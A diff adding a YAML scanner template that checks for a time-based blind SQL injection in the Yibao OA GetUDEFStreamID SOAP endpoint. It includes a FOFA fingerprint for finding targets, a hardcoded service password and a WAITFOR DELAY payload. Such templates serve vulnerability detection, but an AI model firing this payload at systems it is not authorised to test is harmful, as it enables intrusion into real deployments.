@@ -1,0 +1,28 @@
+id: poc-yaml-yi-bao-oa-getudefstreamid-sqli
+info:
+  name: 易宝OA GetUDEFStreamID SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 易宝OA
+  fofa: body="欢迎登录易宝OA系统"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"欢迎登录易宝OA系统")
+- method: POST
+  path: /WebService/BasicService.asmx
+  headers:
+    SOAPAction: http://tempuri.org/GetUDEFStreamID
+    Content-Type: text/xml; charset=utf-8
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetUDEFStreamID xmlns=\"http://tempuri.org/\">\n      <tableName>';WAITFOR\
+    \ DELAY '0:0:{{.t1}}'--</tableName>\n      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>\n\
+    \    </GetUDEFStreamID>\n  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 200 && contains(body,"<GetUDEFStreamIDResult>") && contains(content_type,"text/xml")
+    && duration > t1 && duration < t2
+transport: http
